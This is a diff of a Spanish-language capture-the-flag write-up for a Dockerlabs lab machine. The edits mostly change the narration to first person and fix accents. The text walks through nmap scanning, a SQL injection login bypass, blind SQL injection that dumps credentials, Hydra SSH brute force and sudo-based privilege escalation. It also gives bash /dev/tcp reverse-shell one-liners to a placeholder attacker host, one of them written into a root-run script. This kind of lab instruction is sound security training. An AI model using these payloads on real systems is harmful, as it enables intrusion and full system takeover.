@@ -38,7 +38,7 @@
                 <h2 class="writeup_platform">Plataforma: <span class="dl">Dockerlabs</span></h2>
                 <h3 class="writeup_subtitle">Fase de Reconocimiento</h3>
                 <p class="description">
-                    Primero enviamos un <i>ping</i> a la máquina para saber si tenemos conectividad.
+                    Primero envió un <i>ping</i> a la máquina para saber si tengo conectividad.
                 </p>
                 <pre class="code"><code class="language-ruby">$ ping -c 1 172.17.0.2
 
@@ -49,39 +49,39 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 0.139/0.139/0.139/0.000 ms</code></pre>
                 <p class="description">
-                    Gracias al <span class="highlight">ttl</span> nos podemos dar cuenta que la máquina es una <b>Linux</b>, ya que usualmente un ttl de 64 = Linux y un ttl 128 = Windows (<i>aunque tambien debemos tener en cuenta que este valor se puede cambiar</i>)
+                    Gracias al <span class="highlight">ttl</span> puedo darme cuenta que la máquina es una <b>Linux</b>, ya que usualmente un ttl de 64 = Linux y un ttl 128 = Windows (<i>aunque también debemos tener en cuenta que este valor se puede cambiar</i>).
                 </p>
                 <p class="description">
-                    Utilizando <span class="highlight">nmap</span> escaneamos los puertos abiertos de la máquina víctima:
+                    Utilizando <span class="highlight">nmap</span> escaneo los puertos abiertos de la máquina víctima:
                 </p>
                 <pre class="code"><code class="language-ruby">nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 172.17.0.2 -oG allPorts</code></pre>
                 <p class="description">
-                    Con el parámetro <code class="language-ruby">-p-</code> le indicamos que queremos escanear todo el rango de puertos (<i>del 1 al 65535</i>).
+                    Con el parámetro <code class="language-ruby">-p-</code> le indico que quiero escanear todo el rango de puertos (<i>del 1 al 65535</i>).
                     <br>
                     <br>
-                    Como queremos que nos reporte solo los puertos abiertos le ponemos el <code class="language-ruby">--open</code>
+                    Como quiero que me reporte solo los puertos abiertos le pongo el <code class="language-ruby">--open</code>
                     <br>
                     <br>
-                    El <code class="language-ruby">--min-rate 5000</code> es para decirle que queremos enviar paquetes no mas lentos que 5000 paquetes por segundo.
+                    El <code class="language-ruby">--min-rate 5000</code> es para decirle que quiero enviar paquetes no mas lentos que 5000 paquetes por segundo.
                     <br>
                     <br>
-                    Con el parámetro <code class="language-ruby">-sS</code> le indicamos a Nmap que realice un escaneo sigiloso (<i>stealth scan</i>), con esto no concluimos el <b>three way handshake</b>.
+                    Con el parámetro <code class="language-ruby">-sS</code> le indico a Nmap que realice un escaneo sigiloso (<i>stealth scan</i>), con esto no concluye el <b>three way handshake</b>.
                     <br><br>
-                    El parámetro <code class="language-ruby">-n</code> se lo ponemos para que no nos haga resolución DNS.
+                    El parámetro <code class="language-ruby">-n</code> se lo poongo para que no haga resolución DNS.
                     <br><br>
-                    El <code class="language-ruby">-Pn</code> funciona para que no nos haga descubrimiento de host.
+                    El <code class="language-ruby">-Pn</code> funciona para que no haga descubrimiento de host.
                     <br><br>
-                    Con el <i>triple verbose</i> <code class="language-ruby">-vvv</code> le indicamos que a medida de que me vaya realizando el escaneo nos vaya mostrando todo por consola.
+                    Con el <i>triple verbose</i> <code class="language-ruby">-vvv</code> le indico que a medida de que me vaya realizando el escaneo vaya mostrando todo por consola.
                     <br><br>
-                    Y por último, con el parámetro <code class="language-ruby">-oG allPorts</code> le indicamos que queremos exportar la evidencia en un formato grepeable al archivo <i>allPorts</i>, para que mas adelante con la herramienta <b>extractPorts</b> nos copie los puertos en la clipboard.
+                    Y por último, con el parámetro <code class="language-ruby">-oG allPorts</code> le indico que quiero exportar la evidencia en un formato grepeable al archivo <i>allPorts</i>, para que mas adelante con la herramienta <b>extractPorts</b> copie los puertos en la clipboard.
                 </p>
-                <p class="description">Si esperamos a que finalice el escaneo y hacemos un <span class="highlight">cat</span> al archivo <i>allPorts</i> este nos debería mostrar algo así:</p>
+                <p class="description">Si espero a que finalice el escaneo y hago un <span class="highlight">cat</span> al archivo <i>allPorts</i> este me muestra esto:</p>
                 <pre class="code"><code class="language-text"># Nmap 7.94SVN scan initiated Tue Dec 17 12:51:32 2024 as: nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG allPorts 172.17.0.2
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
 Host: 172.17.0.2 ()	Status: Up
 Host: 172.17.0.2 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
 # Nmap done at Tue Dec 17 12:51:33 2024 -- 1 IP address (1 host up) scanned in 1.09 seconds</code></pre>
-                <p class="description">Se ve feo pero el objetivo de esto es que si hacemos un <code class="language-ruby">extractPorts allPorts</code> nos debería de haber copiado los puertos en la clipboard</p>
+                <p class="description">Se ve feo pero el objetivo de esto es que si hago un <code class="language-ruby">extractPorts allPorts</code> me copia los puertos en la clipboard</p>
                 <p class="description">Luego de esto, con Ctrl+shift+v copio los puertos y realizo un escaneo más a fondo:</p>
                 <pre class="code"><code class="language-ruby">nmap -sCV -p22,80 172.17.0.2 -oN targeted</code></pre>
                 <p class="description">
@@ -113,15 +113,15 @@ Service detection performed. Please report any incorrect results at https://nmap
                     <br><br>
                     <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime.png" alt="showtime web">
                     <br><br>
-                    Parece que la web tiene temática de casino. En la esquina superior derecha vemos un botón que dice <i>login</i>, si lo presionamos nos dirige a un panel de login.
+                    Parece que la web tiene temática de casino. En la esquina superior derecha veo un botón que dice <i>login</i>, cuando lo presiono me dirige a un panel de login.
                 </p>
                 <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime2.png" alt="showtime web">
                 <p class="description">
-                    Intente un <i>SQL Injection</i> sencillo (<code class="language-sql">test' or 1=1-- -</code>) y funcionó!.
+                    Intenté un <i>SQL Injection</i> sencillo (<code class="language-sql">test' or 1=1-- -</code>) y funcionó!.
                 </p>
                 <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime3.png" alt="showtime web">
                 <p class="description">
-                    Al ver que el login es vulnerable a una inyección sql, tratare de probar una <i>inyección SQL ciega basada en tiempo</i>. Pueden utilizar <span class="highlight">SQLMap</span> para esta parte, sin embargo yo prefiero los metodos manuales así que hare unos <i>scripts en python</i> para que me automatice la explotación de la vulnerabilidad. En mis <a target="_blank" href="https://n4g1h4ck.github.io/tools.html" class="highlight">Herramientas</a> estarán los scripts explicados para los que quieran utilizarlos.
+                    Al ver que el login es vulnerable a una inyección sql, trataré de probar una <i>inyección SQL ciega basada en tiempo</i>. Puedes utilizar <span class="highlight">SQLMap</span> para esta parte, sin embargo yo prefiero los métodos manuales así que hare unos <i>scripts en python</i> para que me automatice la explotación de la vulnerabilidad. En mis <a target="_blank" href="https://n4g1h4ck.github.io/tools.html" class="highlight">Herramientas</a> estarán los scripts explicados para los que quieran utilizarlos.
                 </p>
                 <h2 class="writeup_subtitle">Inyección SQL ciega basada en tiempo</h2>
                 <p class="description">
@@ -129,51 +129,51 @@ Service detection performed. Please report any incorrect results at https://nmap
                     <br><br>
                     Al finalizar la <i>fuerza bruta</i>, muestra que solo contiene una tabla llamada <i>usuarios</i>, ahora puedo pasar al siguiente script para enumerar las columnas.
                     <br><br>
-                    Gracias al script nos damos cuenta que las columnas que contiene la tabla <i>usuarios</i> son <i>id,username y password</i>. Sabiendo todo lo anterior, ahora se viene lo bueno, con el ultimo script vamos a enumerar los valores que contienen las columnas de la base de datos.
+                    Gracias al script nos damos cuenta que las columnas que contiene la tabla <i>usuarios</i> son <i>id,username y password</i>. Sabiendo todo lo anterior, ahora se viene lo bueno, con el último script voy a enumerar los valores que contienen las columnas de la base de datos.
                     <br><br>
-                    EL ultimo script muestra las siguientes credenciales:
+                    EL último script muestra las siguientes credenciales:
                     <br><br>
                     <i class="highlight">1:lucas:1233211233212:santiago:1234561234563:joe:miclaveesinhackeable</i>
                     <br><br>
                     Donde primero esta el <i class="highlight">nombre de usuario</i> (sin contar el id), luego estan ':' y la <i class="highlight">contraseña</i> del usuario.
                 </p>
                 <p class="description">
-                    Si probamos las credenciales en el login, vemos que al usuario <i class="highlight">joe</i> lo redirige a <i class="highlight">http://172.17.0.2/login_page/admin-panel.php</i>.
+                    Si pruebo las credenciales en el login, veo que al usuario <i class="highlight">joe</i> lo redirige a <i class="highlight">http://172.17.0.2/login_page/admin-panel.php</i>.
                 </p>
                 <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
                 <p class="description">
-                    Vemos que hay un formulario que interpreta codigo python, si escribimos <code class="language-python">print('hola')</code> vemos que nos muestra el output. Lo siguiente que vamos a hacer es verificar si podemos ejecutar comandos con el modulo <i class="highlight">os</i> con este codigo:
+                    Veo que hay un formulario que interpreta código python, si escribo <code class="language-python">print('hola')</code> me muestra el output. Lo siguiente que haré es verificar si puedo ejecutar comandos con el módulo <i class="highlight">os</i> con este código:
                 </p>
                 <pre class="code"><code class="language-python">import os
 os.system('whoami')</code></pre>
                 <br><br>
                 <img src="https://n4g1h4ck.github.io/images/DL/showtime/showtime4.png" alt="showtime web">
-                <p class="description">Vemos que tenemos capacidad de ejecutar comandos, asi que vamos a utilizar un <i>oneliner en bash</i> para obtener una conexion por tcp hacia mi maquina atacante</p>
+                <p class="description">Observo que tengo capacidad de ejecutar comandos, así que voy a utilizar un <i>oneliner en bash</i> para obtener una conexión por tcp hacia mi máquina atacante</p>
                 <pre class="code"><code class="language-python">import os
-os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 0>&1"')</code></pre>
+os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_MAQUINA_ATACANTE/PUERTO_LOCAL 0>&1"')</code></pre>
                 <p class="description">
-                    Si estamos en una terminal con <i class="highlight">netcat</i> en escucha por el puerto especificado y ejecutamos el codigo python, obtendremos una reverse shell a nuestro equipo.
+                    Estando en una terminal con <i class="highlight">netcat</i> en escucha por el puerto especificado, cuando ejecute el código python, obtendré una reverse shell a mi equipo.
                 </p>
                 <h3 class="writeup_subtitle">Tratamiento de la tty</h3>
-                <p class="description">Empezamos dándonos una <i>pseudoconsola</i></p>
+                <p class="description">Empiezo dándome una <i>pseudoconsola</i></p>
                 <pre class="code"><code class="language-ruby">script /dev/null -c bash</code></pre>
-                <p class="description">Ahora presionamos en el teclado <i>Ctrl+z</i></p>
-                <p class="description">Luego de esto escribimos lo siguiente</p>
+                <p class="description">Ahora presiono en el teclado <i>Ctrl+z</i></p>
+                <p class="description">Luego de esto escribo lo siguiente</p>
                 <pre class="code"><code class="language-ruby">stty raw -echo;fg</code></pre>
-                <p class="description">Después escribimos</p>
+                <p class="description">Después escribo</p>
                 <pre class="code"><code class="language-ruby">reset xterm</code></pre>
-                <p class="description">Ahora podemos ejecutar Ctrl+c sin que afecte a la terminal, para ejecutar <i>Ctrl+l</i> y se nos limpie la pantalla debemos ejecutar <span class="highlight">export TERM=xterm</span> y ahora debería funcionar</p>
+                <p class="description">Ahora puedo ejecutar Ctrl+c sin que afecte a la terminal, para ejecutar <i>Ctrl+l</i> y se me limpie la pantalla debo ejecutar <span class="highlight">export TERM=xterm</span> y ahora debería funcionar</p>
                 <p class="description">
-                    si ejecutamos <i class="highlight">nano</i> vemos que las proporciones no son las adecuadas, para cambiarlo nos iremos a una terminal a parte y ejecutaremos <code class="language-ruby">stty size</code> y respondera con dos valores, por ejemplo: 36 140.
+                    Si ejecuto <i class="highlight">nano</i> veo que las proporciones no son las adecuadas, para cambiarlo me voy a una terminal a parte y ejecuto <code class="language-ruby">stty size</code> y responde con dos valores, por ejemplo: 36 140.
                     <br><br>
-                    Entonces, en la terminal donde estabamos antes ejecutaremos <code class="language-ruby">stty rows 36 columns 140</code> para cambiar las dimensiones, ahora si ejecutamos <i class="highlight">nano</i> este debería tener las proporciones verdaderas.
+                    Entonces, en la terminal donde estaba antes escribo <code class="language-ruby">stty rows 36 columns 140</code> para cambiar las dimensiones, ahora si ejecuto <i class="highlight">nano</i> este tiene las proporciones verdaderas.
                 </p>
                 <h3 class="writeup_subtitle">Escalada de Privilegios</h3>
                 <p class="description">
-                   En la ruta <i class="highlight">/var/www/html/login_page</i> existe un archivo <i>db.php</i> que contiene credenciales de una base de datos (<code class="language-php">$conexion=mysqli_connect("127.0.0.1","casino","123321","users");</code>) asi que intentaremos conectarnos para ver que podemos enumerar.
+                   En la ruta <i class="highlight">/var/www/html/login_page</i> existe un archivo <i>db.php</i> que contiene credenciales de una base de datos (<code class="language-php">$conexión=mysqli_connect("127.0.0.1","casino","123321","users");</code>) así que intentaré conectarme para ver que puedo enumerar.
                 </p>
                 <pre class="code"><code class="language-ruby">mysql -h 127.0.0.1 -u casino -p</code></pre>
-                <p class="description">Vemos que podemos acceder, ahora listaremos las bases de datos.</p>
+                <p class="description">Veo que puedo acceder, ahora listo las bases de datos.</p>
                 <pre class="code"><code class="language-ruby">show databases;</code></pre>
                 <pre class="code"><code class="language-ruby">+--------------------+
 | Database           |
@@ -183,9 +183,9 @@ os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 
 | users              |
 +--------------------+
 3 rows in set (0.01 sec)</code></pre>
-                <p class="description">Hay varias pero me interesa la llamada <i>users</i>, asi que la seleccionamos.</p>
+                <p class="description">Hay varias pero me interesa la llamada <i>users</i>, así que la selecciono.</p>
                 <pre class="code"><code class="language-ruby">use users;</code></pre>
-                <p class="description">Ahora listamos las tablas que contiene.</p>
+                <p class="description">Ahora listo las tablas que contiene.</p>
                 <pre class="code"><code class="language-ruby">show tables;</code></pre>
                 <pre class="code"><code class="language-ruby">+-----------------+
 | Tables_in_users |
@@ -193,9 +193,9 @@ os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 
 | usuarios        |
 +-----------------+
 1 row in set (0.00 sec)</code></pre>
-                <p class="description">Aparece solo una que es <i>usuarios</i>, seleccionamos todo lo que contiene a continuacion.</p>
+                <p class="description">Aparece solo una que es <i>usuarios</i>, selecciono todo lo que contiene a continuación.</p>
                 <pre class="code"><code class="language-ruby">select * from usuarios;</code></pre>
-                <p class="description">Esto nos muestra</p>
+                <p class="description">Esto muestra</p>
                 <pre class="code"><code class="language-ruby">+----+----------+----------------------+
 | id | username | password             |
 +----+----------+----------------------+
@@ -204,14 +204,14 @@ os.system('bash -c "bash -i >& /dev/tcp/IP_DE_LA_máquina_ATACANTE/PUERTO_LOCAL 
 |  3 | joe      | MiClaveEsInhackeable |
 +----+----------+----------------------+
 3 rows in set (0.00 sec)</code></pre>
-                <p class="description">Estas credenciales no nos sirven de mucho ya que ya las habiamos descubierto, asi que seguimos buscando.</p>
-                <p class="description">Con el comando <code class="language-ruby">grep 'sh$' /etc/passwd</code> buscamos usuarios validos del sistema y esto nos muestra lo siguiente.</p>
+                <p class="description">Estas credenciales no sirven de mucho ya que ya las había descubierto, así que sigo buscando.</p>
+                <p class="description">Con el comando <code class="language-ruby">grep 'sh$' /etc/passwd</code> busco usuarios válidos del sistema y esto me muestra lo siguiente.</p>
                 <pre class="code"><code class="language-bash">root:x:0:0:root:/root:/bin/bash
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 joe:x:1001:1001:joe,,,:/home/joe:/bin/bash
 luciano:x:1002:1002:luciano,,,:/home/luciano:/bin/bash</code></pre>
-                <p class="description">Existe el usuario <i>joe</i> y <i>luciano</i>, pero no podemos convertirnos en ninguno de los dos ya que no contamos con sus contraseñas.</p>
-                <p class="description">En el directorio <i class="highlight">/tmp</i> encontramos un archivo llamado <i class="highlight">.hidden_text.txt</i>, si le hacemos un <span class="highlight">cat</span> veremos esto: </p>
+                <p class="description">Existe el usuario <i>joe</i> y <i>luciano</i>, pero no puedo convertirme en ninguno de los dos ya que no cuento con sus contraseñas.</p>
+                <p class="description">En el directorio <i class="highlight">/tmp</i> encuentro un archivo llamado <i class="highlight">.hidden_text.txt</i>, si le hago un <span class="highlight">cat</span> veo esto: </p>
                 <pre class="code"><code class="language-bash">Martin, esta es mi lista de mis trucos favoritos de gta sa:
 
 HESOYAM
@@ -292,20 +292,20 @@ SLOWITDOWNBRO
 BAGUVIX
 SPEEDFREAK
 BUBBLECARS</code></pre>
-            <p class="description">Como es sospechoso el archivo, copie su contenido y lo pegue en un archivo llamado <i>claves</i> en mi maquina local.Intente aplicar fuerza bruta con <span class="highlight">Hydra</span> por ssh con los dos usuarios y este listado de claves pero no funcionó asi que copiare el mismo archivo y lo convertire en minusculas para aplicar de nuevo la fuerza bruta de la siguiente manera:</p>
+            <p class="description">Como es sospechoso el archivo, copié su contenido y lo pegué en un archivo llamado <i>claves</i> en mi máquina local.Intenté aplicar fuerza bruta con <span class="highlight">Hydra</span> por ssh con los dos usuarios y este listado de claves pero no funcionó así que copiaré el mismo archivo y lo convertiré en minúsculas para aplicar de nuevo la fuerza bruta de la siguiente manera:</p>
             <pre class="code"><code class="language-ruby">hydra -l joe -P claves ssh://172.17.0.2 -t 4 </code></pre>
-            <p class="description">Y encontro una contraseña valida</p>
+            <p class="description">Y encontró una contraseña v´lida</p>
             <pre class="code"><code class="language-ruby">[22][ssh] host: 172.17.0.2   login: joe   password: chittychittybangbang</code></pre>
-            <p class="description">Ahora toca conectarme a la maquina victima por ssh.</p>
+            <p class="description">Ahora toca conectarme a la máquina víctima por ssh.</p>
             <pre class="code"><code class="language-ruby">ssh joe@172.17.0.2</code></pre>
             <p class="description">Luego proporciono la contraseña y ya estoy conectado.</p>
-            <p class="description">Si hago <code class="language-ruby">sudo -l</code> para buscar comandos que pueda ejecutar con sudo me muestra esto:</p>
+            <p class="description">Si hago <code class="language-ruby">sudo -l</code> que es la abreviatura de <i>substitute user and do</i> y toma prestados los privilegios de otro usuario, por ejemplo, el usuario root. De esta forma, sudo ayuda a realizar las tareas de administración del sistema sin entrar como root. Si lo ejecuto dice:</p>
             <pre class="code"><code class="language-ruby">Matching Defaults entries for joe on 8f73db6db8d6:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
 User joe may run the following commands on 8f73db6db8d6:
     (luciano) NOPASSWD: /bin/posh</code></pre>
-            <p class="description">Esto significa que puedo ejecutar <code class="language-ruby">/bin/posh</code> como <i>luciano</i> sin proporcionar contraseña, entonces, buscando en <a target="_blank" href="https://gtfobins.github.io/" class="highlight">GTFOBins</a> y filtrando por <i>posh</i> me muestra que ejecutando <code class="language-ruby">sudo posh</code> puedo ejecutarlo como <i>root</i>, pero, nosotros no tenemos el privilegio de ejecutarlo como <i>root</i> si no como <i>luciano</i>, de igual manera ejecuto el mismo comando pero indicando que lo quiero ejecutar como el usuario <i>luciano</i>, asi:</p>
+            <p class="description">Esto significa que puedo ejecutar <code class="language-ruby">/bin/posh</code> como <i>luciano</i> sin proporcionar contraseña, entonces, buscando en <a target="_blank" href="https://gtfobins.github.io/" class="highlight">GTFOBins</a> y filtrando por <i>posh</i> me muestra que ejecutando <code class="language-ruby">sudo posh</code> puedo ejecutarlo como <i>root</i>, pero, nosotros no tenemos el privilegio de ejecutarlo como <i>root</i> si no como <i>luciano</i>, de igual manera ejecuto el mismo comando pero indicando que lo quiero ejecutar como el usuario <i>luciano</i>, así:</p>
             <pre class="code"><code class="language-ruby">sudo -u luciano posh</code></pre>
             <p class="description">Ahora que soy el usuario <i>luciano</i> puedo continuar con la escalada de privilegios.</p>
             <p class="description">Si hago un <code class="language-ruby">sudo -l</code> me muestra lo siguiente:</p>
@@ -314,11 +314,11 @@ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\
 
 User luciano may run the following commands on 8f73db6db8d6:
     (root) NOPASSWD: /bin/bash /home/luciano/script.sh</code></pre>
-            <p class="description">Puedo ejecutar como <i>root</i> <code class="language-ruby">/bin/bash</code> y <code class="language-ruby">/home/luciano/script.sh</code>.Bueno, buscando, me di cuenta que puedo editar el <i>script.sh</i> del directorio personal de <i>luciano</i> para entablarme una <i>reverse shell</i> a mi equipo como <i>root</i>, pero la maquina no contenia ni <span class="highlight">nano</span> ni <span class="highlight">vi</span>, pero se puede hacer de otra manera con el signo <i class="highlight">">"</i> de esta manera:</p>
+            <p class="description">Puedo ejecutar como <i>root</i> <code class="language-ruby">/bin/bash</code> y <code class="language-ruby">/home/luciano/script.sh</code>. Intentaré editar el <i>script.sh</i> del directorio personal de <i>luciano</i> para entablarme una <i>reverse shell</i> a mi equipo como <i>root</i>, pero la máquina no contenía ni <span class="highlight">nano</span> ni <span class="highlight">vi</span>, pero se puede hacer de otra forma con el signo <i class="highlight">">"</i> de esta manera:</p>
             <pre class="code"><code class="language-bash">echo "bash -c 'bash -i >& /dev/tcp/IP_DE_LA_MAQUINA_ATACANTE/PUERTO_LOCAL 0>&1'" > script.sh</code></pre>
             <p class="description">Ahora si me pongo en escucha con <span class="highlight">netcat</span> y ejecuto:</p>
             <pre class="code"><code class="language-bash">sudo /bin/bash /home/luciano/script.sh</code></pre>
-            <p class="description">Me establece la conexion como root.</p>
+            <p class="description">Me establece la conexión como root.</p>
             </article>
         </main>
     </div>
